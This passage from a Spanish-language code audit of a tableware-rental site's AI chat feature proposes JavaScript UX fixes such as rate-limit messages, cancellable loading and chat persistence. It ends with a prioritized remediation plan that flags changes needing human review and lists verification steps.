
Enviar las cabeceras estándar (ya incluido en la corrección de **SEC-07**: `standardHeaders: 'draft-7'`) y aprovecharlas en el cliente. Reemplazar `backend/frontend/assets/js/chatwidget.js:148-152`:

```javascript
            const body = await response.json().catch(() => ({}));

            if (response.status === 429) {
                // Limite de peticiones: no es un fallo del sistema, y el tiempo real de
                // espera lo dice Retry-After (la ventana es deslizante, no fija de 60s).
                const espera = parseInt(response.headers.get('Retry-After') || '', 10);
                const cuando = Number.isFinite(espera) && espera > 0
                    ? `${espera} segundo${espera === 1 ? '' : 's'}`
                    : 'unos segundos';
                this.addMessage(
                    `⏳ Estoy recibiendo muchas preguntas a la vez. Vuelve a escribirme en ${cuando}.`,
                    'bot'
                );
                return;
            }

            if (!response.ok || body.success === false) {
                throw new Error(body.error || `Error ${response.status}: ${response.statusText}`);
            }
```

El `return` temprano evita el `throw`, de modo que el aviso se muestra como un mensaje normal del asistente (clase `bot-message`, `:187`) en lugar de una burbuja de error roja. Los bloques `finally` de `:176-179` siguen ejecutándose, así que el indicador de escritura se oculta y `isLoading` se libera correctamente.

---

### UX-04 — La generación de recomendaciones tarda 20-50 s sin progreso, sin poder cancelar y sin protección contra doble clic
**Esfuerzo: medio**

**Archivos y líneas**
- `backend/frontend/assets/js/recommendationcards.js:269-274` — `showLoadingState()`: un único texto estático, `'⏳ Generando recomendaciones con IA (puede tardar 20-50s)...'`.
- `backend/frontend/assets/js/recommendationcards.js:114` — `loadRecommendations` no comprueba si ya hay una petición en curso.
- `backend/frontend/assets/js/recommendationcards.js:182-193` — el `fetch` no recibe `signal`, así que no se puede abortar.
- `backend/frontend/assets/js/recommendationcards.js:484-509` — `submitRecommendation` tampoco se protege contra pulsaciones repetidas.
- `backend/services/iaService.js:22` — el timeout del servidor es de 120 000 ms: la espera máxima real son **dos minutos**.
- (Contraste) `backend/frontend/assets/js/chatwidget.js:122` — el widget de chat **sí** se protege: `if (this.isLoading) return;`

**Descripción**
Durante hasta dos minutos la interfaz muestra una línea de texto inmóvil. No hay animación, ni contador, ni forma de cancelar. El usuario no tiene ninguna señal de que algo siga ocurriendo, y la reacción natural ante una interfaz congelada es volver a pulsar el botón.

Y pulsar otra vez sí tiene consecuencias: no hay ningún guardia, así que se lanza una segunda `loadRecommendations` en paralelo. Ambas escriben en `this.recommendations` (`:129`) y en el grid (`:287`), así que el resultado mostrado es el de la última que responda, que no necesariamente es la última que se pidió. Y ambas consumen cuota del rate limit (5/min), por lo que dos o tres clics de impaciencia dejan el chat bloqueado (UX-03).

**Cambio propuesto**

Tres cambios: guardia de concurrencia, contador de tiempo transcurrido y botón de cancelación con `AbortController`.

Reemplazar `showLoadingState`/`hideLoadingState` (`recommendationcards.js:269-278`):

```javascript
    showLoadingState() {
        const grid = document.getElementById('recommendations-grid');
        if (!grid) return;

        const inicio = Date.now();
        grid.innerHTML = `
            <div style="grid-column:1/-1;text-align:center;padding:28px 16px;color:#666">
                <p style="margin:0 0 6px">⏳ Generando recomendaciones con IA…</p>
                <p style="margin:0;font-size:.9rem">
                    Suele tardar entre 20 y 50 segundos · <span id="rec-transcurrido">0 s</span>
                </p>
                <p style="margin:14px 0 0">
                    <button class="btn btn-secondary" id="rec-cancelar">Cancelar</button>
                </p>
            </div>
        `;

        // Un contador visible es la senal de que el proceso sigue vivo: con un texto
        // estatico durante hasta 2 minutos el usuario vuelve a pulsar el boton.
        this.temporizador = setInterval(() => {
            const span = document.getElementById('rec-transcurrido');
            if (span) span.textContent = `${Math.round((Date.now() - inicio) / 1000)} s`;
        }, 1000);

        document.getElementById('rec-cancelar')?.addEventListener('click', () => {
            this.abortController?.abort();
        });
    }

    hideLoadingState() {
        clearInterval(this.temporizador);
        this.temporizador = null;
    }
```

(Nótese que aquí `hideLoadingState` **sí** pasa a tener cuerpo, así que este hallazgo sustituye a la parte de CAL-07 que proponía eliminarla. Si se aplican ambos, gana esta versión.)

Añadir la guardia y el controlador de aborto. Reemplazar el inicio de `loadRecommendations` (`recommendationcards.js:114-117`):

```javascript
    async loadRecommendations(tipoEvento, numAsistentes, presupuesto = null) {
        if (!this.container) return;

        // Sin esta guardia, dos clics lanzan dos peticiones que escriben en el mismo
        // grid (gana la que responda ultima) y consumen el doble de cuota.
        if (this.cargando) {
            this.showErrorMessage('Ya estoy preparando una propuesta, espera un momento.');
            return;
        }
        this.cargando = true;
        this.abortController = new AbortController();
        this.ultimaPeticion = { tipoEvento, numAsistentes, presupuesto };
        this.showLoadingState();
```

Cerrar el estado en un `finally` al terminar el `try/catch` de `loadRecommendations` (tras el bloque reescrito en UX-01):

```javascript
        } finally {
            this.cargando = false;
            this.abortController = null;
            this.hideLoadingState();
        }
```

Pasar la señal al `fetch` de la IA (`recommendationcards.js:182-193`), añadiendo una clave al objeto de opciones:

```javascript
        const response = await fetch(this.chatApiUrl, {
            method: 'POST',
            signal: this.abortController?.signal,
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${this.getJWT()}`
            },
            body: JSON.stringify({
                mensaje,
                historico: []
            })
        });
```

Y distinguir la cancelación de un error real en el `catch` de `loadRecommendations`:

```javascript
        } catch (error) {
            if (error.name === 'AbortError') {
                this.mostrarGridVacio(
                    'Generación cancelada',
                    'Puedes volver a pedir recomendaciones cuando quieras.'
                );
                return;
            }
            console.error('Error generando recomendaciones:', error);
            this.mostrarGridVacio(
                'No se pudieron generar las recomendaciones',
                error.message || 'Hubo un problema al contactar con el asistente.',
                ['Comprueba tu conexión y pulsa "Volver a intentarlo".']
            );
        } finally {
```

Por último, proteger también el botón de confirmar (`recommendationcards.js:484-488`):

```javascript
    async submitRecommendation() {
        const boton = document.getElementById('confirm-selection');
        if (boton?.disabled) return;

        if (this.selectedProducts.length === 0) {
            this.showErrorMessage('Por favor selecciona al menos un producto');
            return;
        }
        if (boton) boton.disabled = true;
```

y rehabilitarlo al final del método, tras `window.abrirCarrito()` (`:508`):

```javascript
        window.abrirCarrito();
        if (boton) boton.disabled = false;
```

---

### UX-05 — La conversación se pierde al recargar la página aunque ya está guardada en la base de datos
**Esfuerzo: bajo (versión local) / medio (versión con historial real)**

**Archivos y líneas**
- `backend/frontend/assets/js/chatwidget.js:15` — `this.conversationHistory = [];` — solo en memoria.
- `backend/frontend/assets/js/chatwidget.js:163-168` — se alimenta tras cada respuesta.
- `backend/frontend/assets/js/chatwidget.js:49-65` — el mensaje de bienvenida se reconstruye en cada carga.
- `backend/frontend/assets/js/chatwidget.js:144` — solo los últimos 5 turnos viajan como contexto.
- `python-ia/main.py:212-234` — el intercambio **sí** se persiste en `conversaciones_ia`.
- `backend/frontend/assets/js/chatwidget.js:315-324` — existe `exportHistory()` (descarga un JSON), pero no hay ninguna forma de *restaurar*.

**Descripción**
El historial vive únicamente en memoria. Cualquier navegación recarga la página (el frontend son páginas HTML independientes, no una SPA: `catalogo.html`, `mi-cuenta.html`, `mis-alquileres.html`, `perfil.html` cargan el widget por separado) y la conversación desaparece por completo, incluido el contexto que se envía al modelo (`:144`).

La consecuencia es doble: el usuario pierde el hilo visible, y **el modelo pierde el contexto**. Si el cliente estaba refinando una propuesta ("¿y si son 80 en lugar de 50?"), tras la recarga el asistente no sabe de qué se hablaba y responde desde cero.

Lo llamativo es que el dato **ya existe** en la base de datos: cada intercambio se guarda en `conversaciones_ia` con `usuario_id` y `timestamp`. Solo falta leerlo.

**Cambio propuesto**

**Versión mínima (esfuerzo bajo, recomendada para antes de la presentación): persistir en `sessionStorage`.** Sobrevive a la navegación entre páginas del sitio y se limpia al cerrar la pestaña, lo que es adecuado para un dato de conversación en un equipo posiblemente compartido.

Añadir dos métodos a `ChatWidget` (junto a `clearChat`, antes de la línea 303):

```javascript
    /**
     * Clave de almacenamiento por usuario: en un equipo compartido, dos sesiones
     * distintas no deben ver la conversacion de la otra.
     */
    storageKey() {
        return `menaje:chat:${this.userId ?? 'anon'}`;
    }

    /**
     * Guarda el historial en sessionStorage: el frontend son paginas independientes,
     * asi que cualquier navegacion perdia la conversacion Y el contexto que se envia
     * al modelo. sessionStorage sobrevive a la navegacion y se limpia al cerrar la
     * pestana. Toda lectura/escritura va en try/catch: puede lanzar en modo privado.
     */
    persistirHistorial() {
        try {
            sessionStorage.setItem(
                this.storageKey(),
                JSON.stringify(this.conversationHistory.slice(-20))
            );
        } catch { /* sin persistencia: el chat sigue funcionando en memoria */ }
    }

    restaurarHistorial() {
        let guardado = [];
        try {
            guardado = JSON.parse(sessionStorage.getItem(this.storageKey()) || '[]');
        } catch { return; }
        if (!Array.isArray(guardado) || !guardado.length) return;

        this.conversationHistory = guardado;
        for (const turno of guardado) {
            if (turno.usuario) this.addMessage(turno.usuario, 'user');
            if (turno.ia) this.addMessage(turno.ia, 'bot', { timestamp: turno.timestamp });
        }
    }
```

Llamar a `restaurarHistorial()` al inicializar. Reemplazar `chatwidget.js:25-28`:

```javascript
    init() {
        this.createChatUI();
        this.attachEventListeners();
        this.restaurarHistorial();
    }
```

Y persistir tras cada intercambio. Añadir después de `chatwidget.js:168` (el `push` al historial):

```javascript
            this.persistirHistorial();
```

Y limpiar en `clearChat` (`chatwidget.js:303-310`), tras `this.conversationHistory = [];`:

```javascript
        try {
            sessionStorage.removeItem(this.storageKey());
        } catch { /* nada que limpiar */ }
```

**Cuidado con la restauración y el envoltorio de `ia-integration.js`:** `restaurarHistorial` llama a `addMessage(…, 'user')`, y el wrapper de `ia-integration.js:128-131` dispara `extractAndRecommend` para los mensajes de usuario. Al restaurar una conversación que contenga "recomienda … 50 personas" se lanzaría una petición de recomendaciones no solicitada. Para evitarlo, `restaurarHistorial()` debe ejecutarse **antes** de que se instale el envoltorio: hoy es el caso, porque `init()` corre en el constructor (`chatwidget.js:19`, durante `DOMContentLoaded`) y `setupIntegration` se instala como mínimo 100 ms después (`ia-integration.js:20`). Conviene dejarlo escrito en el comentario del método para que nadie lo reordene.

**Versión completa (esfuerzo medio, posterior): leer de la base de datos.** Requiere un endpoint nuevo en Node, por ejemplo `GET /api/ia/historial`, que consulte `SELECT mensaje_usuario, respuesta_ia, timestamp FROM conversaciones_ia WHERE usuario_id = $1 AND estado = 'completada' ORDER BY timestamp DESC LIMIT 20` con `autenticar` y tomando el `usuario_id` del JWT (nunca de la query). Es la solución correcta a medio plazo, sigue plenamente dentro de OPCIÓN 1, y no debe hacerse con prisa porque expone datos de conversación y hay que asegurar que el filtro por usuario es inviolable.

---

### UX-06 — Pedir recomendaciones en el chat gasta dos peticiones de la cuota y no se avisa
**Esfuerzo: bajo**

**Archivos y líneas**
- `backend/frontend/assets/js/ia-integration.js:128-134` — el envoltorio dispara `extractAndRecommend` cuando el mensaje del usuario contiene una palabra clave.
- `backend/frontend/assets/js/ia-integration.js:163-165` — que llama a `loadRecommendations` 1 s después.
- `backend/frontend/assets/js/chatwidget.js:135` — mientras tanto, `sendMessage` ya está haciendo su propia petición a `/api/ia/chat`.
- `backend/frontend/assets/js/recommendationcards.js:182` — la segunda petición, al mismo endpoint.
- `backend/middleware/rateLimitIA.js:7` — el límite: 5 por minuto.

**Descripción**
Un solo mensaje del usuario que contenga una palabra clave (`ia-integration.js:118-122`: "recomienda", "sugiere", "menaje para"…) genera **dos** llamadas a `/api/ia/chat`: la respuesta conversacional y, en paralelo, la generación de recomendaciones. Con BUG-01 sin corregir son tres.

Consumir 2 de las 5 peticiones del minuto por cada mensaje de ese tipo significa que **dos mensajes** agotan la cuota. Y el usuario no tiene forma de saberlo: pidió una cosa, el sistema hizo dos.

Hay además un efecto de interfaz: el panel de recomendaciones se rellena solo, sin que el usuario lo haya pedido explícitamente y posiblemente fuera de la parte visible de la página (`ia-integration.js:111-113` hace `scrollIntoView`, pero solo en el camino del formulario, no en el automático). Y la detección por palabras clave es aproximada: «no me recomiendes copas» contiene "recomiend" y dispara la generación.

**Cambio propuesto**

Ofrecer la acción en lugar de ejecutarla: cuando se detecta la intención y el número de asistentes, el asistente lo **propone** con un botón. Así se gasta una sola petición por mensaje, el usuario mantiene el control y desaparecen los falsos positivos.

Reemplazar el bloque de disparo automático de `ia-integration.js:160-166` (partiendo de la versión de UX-02):

```javascript
        if (numAsistentes) {
            console.log(`🎯 Intención de recomendación detectada: ${tipoEvento}, ${numAsistentes} asistentes`);
            // Se ofrece en lugar de ejecutarse: una peticion automatica extra gasta 2 de
            // las 5 del minuto por mensaje, y la deteccion por palabras clave tiene
            // falsos positivos ("no me recomiendes copas").
            setTimeout(() => this.ofrecerRecomendaciones(tipoEvento, numAsistentes), 800);
        } else {
            // (rama de UX-02: preguntar cuantos asistentes)
        }
```

Y añadir el método a la clase (tras `extractAndRecommend`, después de la línea 167):

```javascript
    /**
     * Propone generar recomendaciones con un boton en el chat, en vez de lanzarlas solo.
     */
    ofrecerRecomendaciones(tipoEvento, numAsistentes) {
        const contenedor = document.getElementById('chat-messages');
        if (!contenedor) return;

        const etiquetas = {
            boda: 'boda', 'cumpleaños': 'cumpleaños', corporativo: 'evento corporativo',
            graduacion: 'graduación', baby_shower: 'baby shower', otro: 'evento'
        };

        const aviso = document.createElement('div');
        aviso.className = 'chat-message bot-message';
        const texto = document.createElement('div');
        texto.className = 'message-content';
        texto.textContent =
            `¿Quieres que prepare una propuesta de menaje para tu ${etiquetas[tipoEvento] || 'evento'} ` +
            `de ${numAsistentes} asistentes?`;

        const boton = document.createElement('button');
        boton.className = 'btn btn-secondary';
        boton.style.marginTop = '8px';
        boton.textContent = '🎯 Generar propuesta';
        boton.addEventListener('click', () => {
            boton.disabled = true;
            boton.textContent = 'Preparando…';
            this.recommendationCards.loadRecommendations(tipoEvento, numAsistentes);
            document.getElementById('recommendations-container')
                ?.scrollIntoView({ behavior: 'smooth' });
        });

        texto.appendChild(document.createElement('br'));
        texto.appendChild(boton);
        aviso.appendChild(texto);
        contenedor.appendChild(aviso);
        contenedor.scrollTop = contenedor.scrollHeight;
    }
```

Se construye con `createElement`/`textContent` en lugar de `innerHTML` para no reintroducir el problema de SEC-06, y se inserta directamente en el DOM en lugar de pasar por `addMessage` para poder incluir el botón (`sanitizeHTML` eliminaría el marcado).


---

## 6. Plan de corrección priorizado

Criterio de ordenación: primero lo que rompe o expone el sistema hoy, después lo que lo romperá de forma predecible, y al final la deuda que no tiene consecuencia inmediata. Dentro de cada bloque, lo de menor esfuerzo va antes.

**Cómo leer la columna "Aplicación":**

- **Automática** — el cambio es local, no altera contratos entre componentes y su efecto es verificable de un vistazo. Se puede aplicar sin supervisión.
- **Revisión humana** — toca configuración compartida, el flujo de autenticación, el esquema de la base de datos, o cambia el comportamiento visible del producto. Requiere que alguien decida y compruebe antes de dar por bueno el cambio.

---

### Bloque A — Antes de la presentación (bloqueantes)

| # | Hallazgo | Archivos | Esfuerzo | Aplicación | Notas |
|---|---|---|---|---|---|
| A1 | **BUG-05** — URL cableada a `localhost:3000` | `chatwidget.js:17` | Bajo | **Automática** | Una línea, a ruta relativa. `recommendationcards.js` ya funciona así, así que el patrón está validado en el propio proyecto. Riesgo prácticamente nulo. |
| A2 | **BUG-01** — doble inicialización de `ia-integration.js` | `ia-integration.js:8-30`, `:42-44` | Bajo | **Automática** | Añade una bandera de idempotencia. Comprobar tras aplicarlo que en la consola aparece **un solo** `✅ IA Integration iniciado` y que hay un único botón "🎯 Recomendaciones" en el DOM. |
| A3 | **BUG-08** — clase CSS inexistente en `clearChat` | `chatwidget.js:306-309`, `:209` | Bajo | **Automática** | Dos literales. Sin efectos colaterales. |
| A4 | **BUG-06** — eliminar `GROQ_API_KEY` | `python-ia/.env:12-13`, `backend/.env:17` | Bajo | Revisión humana | El cambio es trivial, pero implica **decidir** entre eliminar la variable o implementar el fallback. Recomendación: eliminar ahora, y documentar en `python-ia/README.md` que no hay proveedor de respaldo. |
| A5 | **SEC-08** — rotar `API_GEMINI_KEY` y sacarla de `backend/.env` | `python-ia/.env:9`, `backend/.env:13-14,17` | Bajo | Revisión humana | Hay que revocar la clave en Google AI Studio y generar otra: es una acción externa e irreversible. Tras rotarla, **arrancar el microservicio y probar un mensaje** antes de dar el paso por cerrado. |
| A6 | **SEC-02** — cerrar `/docs`, `/redoc`, `/openapi.json` | `python-ia/main.py:63-67`, `:320` | Bajo | Revisión humana | Con `IA_ENV` sin definir la documentación queda cerrada. Si el equipo la usa para depurar, hay que decidir y añadir `IA_ENV=dev` al `.env` local — es una decisión de proceso, no de código. |
| A7 | **SEC-03** — no filtrar errores de Gemini al navegador | `python-ia/main.py:293-295`, `iaService.js:46-51` | Bajo | Revisión humana | Cambia el contrato de errores entre las tres capas. Verificar con un fallo provocado (clave inválida temporal) que el cliente ve el mensaje genérico y que el log del servidor **sí** tiene el detalle y el `error_id`. |
| A8 | **BUG-03** — normalizar nombres en la validación anti-alucinación | `recommendationcards.js:227-254` | Medio | Revisión humana | Es el cambio más delicado del bloque: relaja deliberadamente un control anti-alucinación. La tercera pasada (por palabras) **debe** exigir candidato único, porque atribuirle al cliente un producto y un precio que el modelo no eligió sería peor que descartarlo. Probar con los 7 casos de la tabla de BUG-03 antes de dar por bueno. |
| A9 | **UX-01** — estado vacío explicativo en el grid | `recommendationcards.js:114-142`, `:269-278` | Bajo | Revisión humana | Cambia lo que ve el usuario en cuatro caminos de fallo distintos. Conviene que alguien lea los textos antes de publicarlos. Depende de `escaparHTML` (SEC-06), así que aplicar SEC-06 primero o incluir el helper en este mismo cambio. |
| A10 | **SEC-01** — autenticar `POST /chat` y escuchar solo en loopback | `python-ia/main.py` (varios), `iaService.js:5,21-26,65`, ambos `.env` | Medio | **Revisión humana (obligatoria)** | Es el hallazgo crítico y el más invasivo: si el token no coincide exactamente en los dos `.env`, **todo el chat deja de funcionar con 401**. Nunca aplicar sin probar el camino completo (navegador → Node → FastAPI) inmediatamente después. Aplicar al final del bloque, con tiempo de margen antes de la presentación, nunca el mismo día. |

**Verificación de salida del bloque A** (hacer en este orden, con los dos servicios levantados):

1. `GET http://127.0.0.1:8000/docs` → 404.
2. `curl -X POST http://127.0.0.1:8000/chat -H 'Content-Type: application/json' -d '{"usuario_id":1,"mensaje":"hola"}'` → **401 No autorizado** (sin la cabecera del token).
3. Iniciar sesión en el frontend, abrir el chat, enviar un mensaje → respuesta correcta.
4. Botón "🎯 Recomendaciones" con «boda / 120 asistentes» → tarjetas con productos reales, precios y stock del catálogo.
5. `SELECT estado, COUNT(*) FROM conversaciones_ia GROUP BY estado;` → hay filas y el `estado` es coherente.
6. En la consola del navegador: un solo `✅ IA Integration iniciado`, sin errores.

---

### Bloque B — Siguiente iteración (romperán de forma predecible, o son riesgo abierto)

| # | Hallazgo | Archivos | Esfuerzo | Aplicación | Notas |
|---|---|---|---|---|---|
| B1 | **SEC-06** — escapar el HTML en las tarjetas de recomendación | `recommendationcards.js:303-344`, `:415`, `+ helpers` | Bajo | **Automática** | XSS almacenado con escalada `trabajador` → robo de JWT. Solo añade escapado en la salida: no cambia ningún comportamiento legítimo. Es el hallazgo de mayor severidad del bloque y el de menor riesgo al aplicar — si el bloque A se retrasa, subir este a A. |
| B2 | **SEC-07** — rate limit por usuario y `parseInt` del límite | `rateLimitIA.js` (archivo completo) | Bajo | Revisión humana | Cambia la clave del limitador de IP a usuario: es un cambio de política, no solo de implementación. Verificar que `req.usuario` está poblado (lo está: `autenticar` va antes en `routes/index.js:44`). Incluye la eliminación del `skip` (CAL-08) y habilita `standardHeaders`, que UX-03 necesita. |
| B3 | **CAL-08** — eliminar el `skip` inalcanzable | `rateLimitIA.js:13-16` | Bajo | **Automática** | Se aplica dentro de B2; no es un cambio independiente. |
| B4 | **BUG-02** — acotar el catálogo del prompt | `recommendationcards.js:163-180` + `routes/index.js:64-69` + `productosController.js:26` | Medio | Revisión humana | Hoy no falla (28 productos, 2 747 caracteres); fallará por completo a ~70. Al aplicarlo hay que tener cuidado de que `resolverContraCatalogo` siga recibiendo el catálogo **completo** y solo el prompt reciba el acotado: confundirlos reintroduciría BUG-03 de la peor forma. |
| B5 | **BUG-07** — no degradar en silencio ante fallo de BD | `python-ia/main.py:110-171` | Medio | Revisión humana | Convierte un `200` con información falsa en un `503` honesto. Cambia el comportamiento ante caídas de la base de datos, así que hay que probarlo apagando PostgreSQL a propósito. Incluye el cambio de SEC-04 en el mismo bloque. |
| B6 | **SEC-04** — no distinguir usuario existente de inexistente | `python-ia/main.py:126-133` | Bajo | **Automática** | Se aplica dentro de B5. `construir_system_prompt` ya tolera `usuario` vacío (`main.py:176`, `:198`), así que no rompe nada. |
| B7 | **BUG-04** — registrar el estado real en `conversaciones_ia` | `python-ia/main.py:212-234`, `:293-300` + migración 002 | Medio | **Revisión humana (obligatoria para la migración)** | El cambio en Python es seguro. La migración `002` añade `NOT NULL` y un `CHECK`: **hacer copia de la base de datos antes**, y ejecutar el `UPDATE` de normalización que incluye, o el `ALTER` fallará si hay filas con valores fuera del dominio. |
| B8 | **SEC-05** — quitar el CORS del microservicio | `python-ia/main.py:69-76`, `:23` | Bajo | Revisión humana | Eliminar middleware siempre merece una comprobación de que nadie dependía de él. Aquí nadie debería: el navegador nunca llama al puerto 8000. Confirmar que no hay ninguna herramienta interna apuntando ahí antes de quitarlo. |
| B9 | **SEC-09** — autenticar `/api/ia/health` y no revelar el modelo | `routes/index.js:102`, `python-ia/main.py:241-248` | Bajo | Revisión humana | Si alguna monitorización externa sondea `/api/ia/health` sin token, este cambio la rompe. Comprobarlo antes; si existe, darle una vía autenticada. |
| B10 | **BUG-09** — topar cantidades al stock disponible | `recommendationcards.js:238-252`, `:320-323`, `:417-420`, `:443-449` | Medio | Revisión humana | Cambia las cantidades que ve el cliente. Verificar el caso límite del evento grande con producto de poco stock (p. ej. 300 asistentes con `Mantel Dorado Satinado`, stock 40). |

---

### Bloque C — Deuda técnica (sin consecuencia inmediata)

| # | Hallazgo | Archivos | Esfuerzo | Aplicación | Notas |
|---|---|---|---|---|---|
| C1 | **CAL-02** — eliminar `httpx` sin usar | `python-ia/requirements.txt:7` | Bajo | **Automática** | Depende de la decisión de A4: si se implementa el fallback, `httpx` podría hacer falta. Con la opción recomendada (eliminar Groq), se borra. Reconstruir el `venv` después. |
| C2 | **CAL-09** — no enviar `usuario_id` en el cuerpo | `chatwidget.js:141-145`, `recommendationcards.js:188-192` | Bajo | **Automática** | El servidor ya lo ignora (`routes/index.js:46-47`), así que quitarlo no puede cambiar el comportamiento. |
| C3 | **BUG-10** — corregir el Markdown de `sanitizeHTML` | `chatwidget.js:249-256` | Bajo | **Automática** | Puramente cosmético y contenido en un método. |
| C4 | **CAL-07** — eliminar `hideLoadingState` y `playNotificationSound` | `recommendationcards.js:276-278`, `chatwidget.js:282-286`, `:208-211` | Bajo | Revisión humana | **Conflicto:** UX-04 le da cuerpo a `hideLoadingState`. Si se va a hacer UX-04, aplicar solo la parte de `playNotificationSound`. Decidir antes de tocar. |
| C5 | **CAL-03** — consolidar los `.env` y `.env.example` | `backend/.env`, `python-ia/.env`, `backend/.env.example`, nuevo `python-ia/.env.example`, `.gitignore` | Bajo | **Revisión humana (obligatoria)** | Toca los archivos que hacen arrancar los dos servicios. Un nombre mal escrito impide el arranque (`db.js:6-8`, `main.py:47-51`). Aplicar con ambos servicios detenidos y arrancarlos después uno a uno. Absorbe las ediciones de A4 y A5, así que conviene hacerlo **después** de ellas o fusionarlo con ellas. |
| C6 | **CAL-04** — verificar el modelo al arrancar | `python-ia/main.py:59-61` | Bajo | Revisión humana | Añade una llamada de red en el arranque. Ejecutarla una vez aclara además si `gemini-3.6-flash` (`python-ia/.env:10`) y el valor por defecto `gemini-1.5-flash` (`main.py:38`) siguen siendo válidos para la clave en uso — una duda que conviene resolver explícitamente. |
| C7 | **CAL-06** — pasar de `print` a `logging` | `python-ia/main.py` (7 puntos) | Bajo | **Automática** | Mecánico. Deja el mensaje del usuario en nivel `DEBUG`, lo que además reduce lo que se escribe en los logs por defecto. |
| C8 | **CAL-01** — pool de conexiones en el microservicio | `python-ia/main.py:99-107`, `:121-169`, `:216-234` | Medio | **Revisión humana (obligatoria)** | Reescribe la gestión de transacciones del servicio. Un `putconn` mal colocado provoca fugas de conexiones que solo se manifiestan bajo carga. **Aplicar en la misma pasada que B5 y B7**, que tocan las mismas funciones, para no reescribir tres veces los mismos bloques. Probar con varias peticiones concurrentes y comprobar `SELECT count(*) FROM pg_stat_activity WHERE datname = 'menajeDB';` antes y después. |
| C9 | **CAL-05** — extraer `ia-auth.js` compartido | nuevo `ia-auth.js` + 2 componentes + 4 páginas HTML | Bajo | Revisión humana | Hay que añadir la etiqueta `<script>` en **las cuatro** páginas (`catalogo.html:113`, `mi-cuenta.html:40`, `mis-alquileres.html:74`, `perfil.html:33`) **antes** de los componentes. Olvidar una deja esa página con `window.IAAuth` indefinido y el chat sin token. |

---

### Bloque D — Experiencia de usuario (mejoras, no correcciones)

| # | Hallazgo | Archivos | Esfuerzo | Aplicación | Notas |
|---|---|---|---|---|---|
| D1 | **UX-03** — informar del tiempo real de espera en el 429 | `chatwidget.js:148-152` | Bajo | **Automática** | Requiere `standardHeaders` de B2. Con B2 aplicado, el cambio en el cliente es autónomo y degrada bien ("unos segundos") si la cabecera no llega. |
| D2 | **UX-02** — mejorar la detección del número de asistentes | `ia-integration.js:157-166` + estáticas | Bajo | Revisión humana | Cambia cuándo se dispara una acción automática. Probar los 5 casos listados en UX-02, incluido el que debe devolver `null` y preguntar. |
| D3 | **UX-06** — ofrecer las recomendaciones en vez de lanzarlas | `ia-integration.js:160-167` + nuevo método | Bajo | Revisión humana | Cambio de comportamiento deliberado: el panel deja de rellenarse solo. Es la decisión correcta (ahorra la mitad de la cuota y elimina los falsos positivos), pero es una decisión de producto. Aplicar **después** de D2, sobre el mismo bloque de código. |
| D4 | **UX-05** — persistir la conversación en `sessionStorage` | `chatwidget.js:15`, `:25-28`, `:163-168`, `:303-310` | Bajo | Revisión humana | Ojo al orden de inicialización: `restaurarHistorial()` debe ejecutarse antes de que `ia-integration.js` envuelva `addMessage`, o restaurar un mensaje con "recomienda" dispararía una petición no solicitada. Hoy el orden es correcto por temporización; el comentario del método lo deja escrito. |
| D5 | **UX-04** — contador, cancelación y guardia de doble clic | `recommendationcards.js:114-142`, `:269-278`, `:182-193`, `:484-509` | Medio | Revisión humana | El de mayor superficie del bloque. Incluye `AbortController`, así que hay que comprobar que la cancelación deja el estado limpio (`cargando = false`, temporizador parado) y que un segundo intento tras cancelar funciona. **Sustituye** a la parte de C4 relativa a `hideLoadingState`. |

---

### Dependencias y conflictos entre cambios

Vale la pena tenerlos presentes para no reescribir el mismo código dos veces ni aplicar parches incompatibles:

- **`python-ia/main.py` concentra seis hallazgos que tocan las mismas funciones.** `obtener_contexto` la modifican SEC-04 y BUG-07; `guardar_conversacion` la modifican BUG-04 y CAL-01; el `except` de Gemini lo modifican SEC-03 y BUG-04. **Recomendación: una sola pasada de reescritura de `main.py`** que incorpore SEC-01, SEC-02, SEC-03, SEC-04, SEC-09, BUG-04, BUG-07, CAL-01, CAL-04 y CAL-06, en lugar de diez parches sucesivos. El bloque A necesita SEC-01/02/03 antes que el resto, así que el corte natural son dos pasadas: una en el bloque A y otra que absorba B5, B7 y C8.
- **`rateLimitIA.js` se reescribe completo en SEC-07**, que ya incluye CAL-08 (eliminar el `skip`) y habilita lo que UX-03 necesita. No aplicar CAL-08 por separado.
- **`escaparHTML` (SEC-06) es prerrequisito de UX-01**, que lo usa en `mostrarGridVacio`.
- **`standardHeaders` (SEC-07) es prerrequisito de UX-03.**
- **CAL-07 y UX-04 son incompatibles** en lo relativo a `hideLoadingState`: uno la elimina, el otro le da cuerpo. Decidir primero si se hará UX-04.
- **CAL-03 absorbe las ediciones de `.env` de A4, A5, SEC-01 y BUG-02.** Hacerlo al final, o fusionarlo con el primero de ellos que se aplique, para no editar los mismos archivos cinco veces.
- **`recommendationcards.js` acumula cinco hallazgos** (SEC-06, BUG-02, BUG-03, BUG-09, UX-01, UX-04). El orden menos conflictivo es: SEC-06 → BUG-03 → UX-01 → BUG-02 → BUG-09 → UX-04.

### Sobre la verificación

El proyecto **no tiene pruebas automatizadas**: no hay directorio de tests, `backend/package.json` no define un script `test`, y `python-ia/requirements.txt` no incluye `pytest`. Eso significa que la única red de seguridad de todos estos cambios es la comprobación manual, y es la razón por la que tantas filas de este plan están marcadas como "revisión humana" aunque el cambio sea pequeño.

Dentro de OPCIÓN 1, las tres pruebas con mejor relación coste/beneficio serían:

1. **`resolverContraCatalogo` / `buscarProductoEnCatalogo`** (BUG-03): es lógica pura, sin red ni DOM, y es donde un error silencioso hace más daño. Los 7 casos de la tabla de BUG-03 son la batería de partida.
2. **`extraerNumeroAsistentes`** (UX-02): lógica pura igualmente, con casos que ya están enumerados.
3. **`POST /chat` del microservicio con el token mal y bien** (SEC-01): una prueba de integración de dos casos que impide que una regresión reabra el hallazgo crítico.

Montarlas es trabajo de esfuerzo **medio** y no es requisito de la presentación, pero conviene que conste: hoy cada una de las correcciones de este documento se valida mirando la pantalla.
---

## 7. Fuera de alcance de OPCIÓN 1

Estas observaciones surgieron durante la auditoría pero **requerirían OPCIÓN 2 (Deep Learning)** o infraestructura equivalente. Se anotan explícitamente para que consten como identificadas y como decisión consciente de no abordarlas, **no** como mejoras propuestas.

| Observación | Por qué queda fuera | Qué se hace en su lugar dentro de OPCIÓN 1 |
|---|---|---|
| **Coincidencia semántica de nombres de producto** en la validación anti-alucinación (BUG-03). Lo robusto de verdad sería indexar el catálogo con embeddings y resolver el nombre devuelto por el modelo por similitud vectorial. | Requiere un modelo de embeddings y una base de datos vectorial. | Normalización Unicode + coincidencia por inclusión y por palabras, todo con comparación de cadenas (BUG-03). Cubre los casos reales de reescritura del modelo sin dependencias nuevas. |
